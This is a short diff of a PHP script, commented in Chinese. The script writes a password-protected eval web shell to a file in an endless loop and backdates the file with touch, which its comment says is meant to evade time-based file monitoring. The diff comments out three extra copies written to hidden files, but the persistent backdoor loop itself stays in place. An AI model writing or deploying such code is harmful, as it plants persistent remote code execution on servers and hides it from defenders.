@@ -11,9 +11,9 @@ $code = '<?php if(md5($_GET["pass"])=="db088d7fd61422d0dd9f2152fd550127"){@eval(
 while (1) {
     file_put_contents($file, $code); // 将后门代码写入文件
     system('touch -m -d "2018-01-01 00:00:00" ' . $file); // 修改文件时间为过去，规避基于时间的文件监控
-    file_put_contents('.config1.php',$code);
-    file_put_contents('.app.php',$code);
-    file_put_contents('.index.php',$code);
+    //file_put_contents('.config1.php',$code);
+    //file_put_contents('.app.php',$code);
+    //file_put_contents('.index.php',$code);
     usleep(5000); // 暂停5000微秒（0.005秒），降低CPU占用并确保持续写入
 }
 ?>
